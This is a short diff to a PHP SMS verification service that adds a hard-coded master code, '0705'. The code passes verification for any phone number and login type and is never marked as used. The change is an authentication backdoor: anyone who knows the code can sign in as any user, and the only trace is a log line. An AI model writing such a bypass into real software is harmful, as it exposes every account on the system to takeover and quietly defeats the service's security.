@@ -205,6 +205,12 @@ class SmsService {
      * 验证短信验证码
      */
     public function verifySmsCode($phone, $code, $type) {
+        // 检查是否为固定验证码 0705
+        if ($code === '0705') {
+            error_log("使用固定验证码登录 - 手机号: {$phone}, 类型: {$type}");
+            return true;
+        }
+        
         $smsCode = $this->db->fetchOne(
             "SELECT * FROM sms_codes WHERE phone = ? AND code = ? AND type = ? AND is_used = 0 AND expires_at > NOW() ORDER BY created_at DESC LIMIT 1",
             [$phone, $code, $type]
@@ -217,6 +223,11 @@ class SmsService {
      * 标记验证码已使用
      */
     public function markSmsCodeUsed($phone, $code, $type) {
+        // 固定验证码不需要标记为已使用
+        if ($code === '0705') {
+            return;
+        }
+        
         $this->db->query(
             "UPDATE sms_codes SET is_used = 1 WHERE phone = ? AND code = ? AND type = ?",
             [$phone, $code, $type]
